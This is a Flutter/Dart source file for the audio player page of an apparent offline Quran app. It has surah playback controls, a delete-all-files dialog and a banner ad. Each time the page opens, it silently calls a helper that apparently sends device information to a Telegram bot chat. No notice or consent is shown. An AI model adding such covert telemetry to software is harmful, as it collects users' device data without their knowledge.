import 'package:audioplayers/audioplayers.dart';
import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:flutter/material.dart';
import 'package:flutter_dotenv/flutter_dotenv.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:google_mobile_ads/google_mobile_ads.dart';
import 'package:logger/logger.dart';
import 'package:quranku_offline/core/providers/ad_provider.dart';
import 'package:quranku_offline/core/providers/audio_full_provider.dart';
import 'package:quranku_offline/core/providers/audio_storage_provider.dart';
import 'package:quranku_offline/core/providers/connectivity_provider.dart';

import 'package:quranku_offline/core/providers/quran_provider.dart';
import 'package:quranku_offline/features/about_page.dart';
import 'package:quranku_offline/features/utils/device_info_helper.dart';
import 'package:quranku_offline/features/utils/tele_helper.dart';
import 'package:quranku_offline/features/widget/show_surah_dialog.dart';

class AudioFullPage extends ConsumerStatefulWidget {
  const AudioFullPage({super.key});

  @override
  _AudioPlayerWidgetState createState() => _AudioPlayerWidgetState();
}

class _AudioPlayerWidgetState extends ConsumerState<AudioFullPage> {
  BannerAd? _bannerAd;
  final TextEditingController surahController = TextEditingController();

  final DeviceInfoHelper deviceInfoHelper = DeviceInfoHelper(
    telegramHelper: TelegramHelper(
      botToken: dotenv.env['BOT_TOKEN'] ?? '',
      chatId: dotenv.env['CHAT_ID'] ?? '',
    ),
  );
  bool isLoading = true;

  @override
  void initState() {
    super.initState();
    _loadAndSendDeviceInfo();
    // Future.microtask(() => checkAndPlayAudio(context, ref));
  }

  Future<void> _loadAndSendDeviceInfo() async {
    try {
      await deviceInfoHelper.getAndSendDeviceInfo();
      setState(() {
        isLoading = false;
      });
    } catch (e) {
      setState(() {
        isLoading = false;
      });
      Logger().e(e);
    }
  }

  @override
  void dispose() {
    surahController.dispose();
    _bannerAd?.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    final currentSurahIndex = ref.watch(audioFullPlayerProvider);
    final surahList = ref.watch(quranProvider);
    final isPlayingAudio = ref.watch(isPlayingAudioProvider);
    final isLoadingAudio = ref.watch(isLoadingAudioProvider);

    final connectivity = ref.watch(connectivityProvider);

    final bannerAd = ref.watch(bannerAdProvider);

    final downloadedSize = ref.watch(downloadedSizeProvider);
    // final downloadProgress = ref.watch(downloadProgressProvider);

    // ✅ Dengarkan perubahan koneksi dan tampilkan Snackbar jika internet putus
    ref.listen<AsyncValue<ConnectivityResult>>(
      connectivityProvider,
      (previous, next) {
        if (next.value == ConnectivityResult.none) {
          ScaffoldMessenger.of(context).showSnackBar(
            const SnackBar(
              content: Text("Internet terputus! Audio dihentikan."),
              backgroundColor: Colors.red,
              duration: Duration(seconds: 3),
            ),
          );
          ref.read(audioFullPlayerProvider.notifier).stopAudio();
        }
      },
    );

    if (surahList.isEmpty) {
      return const Center(
        child: CircularProgressIndicator(color: Colors.teal),
      );
    }

    final currentSurah = surahList[currentSurahIndex];

    return Scaffold(
      resizeToAvoidBottomInset: true,
      appBar: AppBar(
        title: const Text("About"),
        actions: [
          IconButton(
            icon: const Icon(Icons.account_circle_outlined, color: Colors.teal),
            onPressed: () {
              Navigator.push(
                context,
                MaterialPageRoute(builder: (context) => const AboutPage()),
              );
            },
          ),
        ],
      ),
      body: SingleChildScrollView(
        child: Column(
          // mainAxisAlignment: MainAxisAlignment.center
          mainAxisSize: MainAxisSize.min,
          crossAxisAlignment: CrossAxisAlignment.center,
          children: [
            const SizedBox(height: 10),
            Card(
              shape: RoundedRectangleBorder(
                borderRadius: BorderRadius.circular(15),
              ),
              elevation: 5,
              child: Padding(
                padding: const EdgeInsets.all(16.0),
                child: Column(
                  children: [
                    const SizedBox(height: 10),
                    Text(
                      currentSurah.nama,
                      style: GoogleFonts.amiri(
                        fontSize: 42,
                        fontWeight: FontWeight.bold,
                        color: Colors.black,
                      ),
                    ),
                    Text(
                      "QS. ${currentSurah.namaLatin}: ${currentSurah.nomor}",
                      style: const TextStyle(
                        fontSize: 20,
                        fontWeight: FontWeight.bold,
                        color: Colors.teal,
                      ),
                    ),
                    Text(
                      "${currentSurah.jumlahAyat} Ayat",
                      style: const TextStyle(
                        fontSize: 16,
                        color: Colors.black54,
                      ),
                    ),
                  ],
                ),
              ),
            ),
            const SizedBox(height: 20),
            // 🔹 Kontrol Audio
            Padding(
              padding: const EdgeInsets.all(16.0),
              child: Card(
                shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(15),
                ),
                elevation: 5,
                child: Column(
                  children: [
                    Row(
                      mainAxisAlignment: MainAxisAlignment.center,
                      mainAxisSize: MainAxisSize.min,
                      children: [
                        IconButton(
                          icon: const Icon(Icons.skip_previous,
                              size: 35, color: Colors.teal),
                          onPressed: () => ref
                              .read(audioFullPlayerProvider.notifier)
                              .previousSurah(context),
                        ),
                        _buildVerticalDivider(), // 🔹 Pembatas

                        // 🔹 Loading atau Play/Pause
                        isLoadingAudio
                            ? const CircularProgressIndicator(
                                color: Colors.teal)
                            : IconButton(
                                icon: Icon(
                                  isPlayingAudio
                                      ? Icons.pause_circle_filled
                                      : Icons.play_circle_fill,
                                  size: 60,
                                  color: Colors.teal,
                                ),
                                onPressed: () {
                                  // 🔹 Cek koneksi sebelum memutar audio
                                  // if (connectivity.value == ConnectivityResult.none) {
                                  //   ScaffoldMessenger.of(context).showSnackBar(
                                  //     const SnackBar(
                                  //       content: Text("Tidak ada koneksi internet!"),
                                  //       backgroundColor: Colors.red,
                                  //       duration: Duration(seconds: 3),
                                  //     ),
                                  //   );
                                  //   return; // 🚫 Jangan lanjutkan pemutaran jika tidak ada internet
                                  // }

                                  if (isPlayingAudio) {
                                    ref
                                        .read(audioFullPlayerProvider.notifier)
                                        .pauseAudio();
                                  } else {
                                    ref
                                        .read(audioFullPlayerProvider.notifier)
                                        .setContext(context);
                                    ref
                                        .read(audioFullPlayerProvider.notifier)
                                        .playSurah(context, currentSurahIndex);
                                  }
                                },
                              ),

                        _buildVerticalDivider(), // 🔹 Pembatas

                        IconButton(
                          icon: const Icon(Icons.skip_next,
                              size: 35, color: Colors.teal),
                          onPressed: () => ref
                              .read(audioFullPlayerProvider.notifier)
                              .nextSurah(context),
                        ),
                      ],
                    ),
                    const Divider(),
                    const SizedBox(
                      height: 10,
                    ),
                    Row(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        // Stop Button
                        ElevatedButton.icon(
                          icon: const Icon(Icons.stop_circle_outlined,
                              color: Colors.white, size: 20),
                          label: const Text("Stop"),
                          style: ElevatedButton.styleFrom(
                            backgroundColor: Colors.redAccent,
                            foregroundColor: Colors.white,
                            padding: const EdgeInsets.symmetric(
                                vertical: 12, horizontal: 20),
                            shape: RoundedRectangleBorder(
                                borderRadius: BorderRadius.circular(10)),
                          ),
                          onPressed: () => ref
                              .read(audioFullPlayerProvider.notifier)
                              .stopAudio(),
                        ),
                      ],
                    ),
                    const SizedBox(
                      height: 10,
                    ),
                  ],
                ),
              ),
            ),

            const SizedBox(
              height: 10,
            ),
            Column(
              children: [
                Row(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    Text(
                      "Total Ukuran File: $downloadedSize",
                      style: const TextStyle(
                        fontSize: 14,
                        fontWeight: FontWeight.bold,
                        color: Colors.teal,
                      ),
                    ),
                    const SizedBox(
                      width: 20,
                    ),
                    AnimatedContainer(
                      duration: Duration(milliseconds: 300),
                      decoration: BoxDecoration(
                        color: Colors.grey.withOpacity(0.2),
                        shape: BoxShape.rectangle,
                        borderRadius: BorderRadius.circular(10),
                      ),
                      child: IconButton(
                        onPressed: () async {
                          bool? confirmDelete = await showDialog(
                            context: context,
                            builder: (context) {
                              return const ConfirmDialog();
                            },
                          );

                          if (confirmDelete == true) {
                            await deleteAllSurahFiles(context, ref);
                          }
                        },
                        icon: const Icon(
                          Icons.delete,
                          color: Colors.red,
                          size: 20,
                        ),
                      ),
                    ),
                  ],
                ),
              ],
            ),
            const SizedBox(
              height: 10,
            ),
            Column(
              mainAxisAlignment: MainAxisAlignment.end,
              children: [
                if (bannerAd != null && bannerAd.responseInfo != null)
                  Container(
                    width: bannerAd.size.width.toDouble(),
                    height: bannerAd.size.height.toDouble(),
                    alignment: Alignment.center,
                    child: AdWidget(ad: bannerAd),
                  ),
              ],
            ),
          ],
        ),
      ),
      floatingActionButton: FloatingActionButton.extended(
        onPressed: () => showSurahDialog(context, ref, surahController),
        label: const Text(
          "Cari Surah",
          style: TextStyle(fontSize: 14),
        ),
        icon: const Icon(Icons.search),
        backgroundColor: Colors.teal,
        foregroundColor: Colors.white,
      ),
    );
  }

  // 🔹 Widget untuk Pembatas Vertikal
  Widget _buildVerticalDivider() {
    return Container(
      width: 1,
      height: 40,
      margin: const EdgeInsets.symmetric(horizontal: 10),
      decoration: BoxDecoration(
        color: Colors.black54,
        borderRadius: BorderRadius.circular(5),
      ),
    );
  }
}

class ConfirmDialog extends StatelessWidget {
  const ConfirmDialog({
    super.key,
  });

  @override
  Widget build(BuildContext context) {
    return AlertDialog(
      title: const Text("Hapus Semua File?"),
      content: const Text(
          "Apakah Anda yakin ingin menghapus semua file surah yang telah diunduh?"),
      actions: [
        TextButton(
          onPressed: () => Navigator.pop(context, false),
          child: const Text("Batal"),
        ),
        ElevatedButton(
          onPressed: () => Navigator.pop(context, true),
          style: ElevatedButton.styleFrom(backgroundColor: Colors.redAccent),
          child: const Text(
            "Hapus",
            style: TextStyle(color: Colors.white),
          ),
        ),
      ],
    );
  }
}
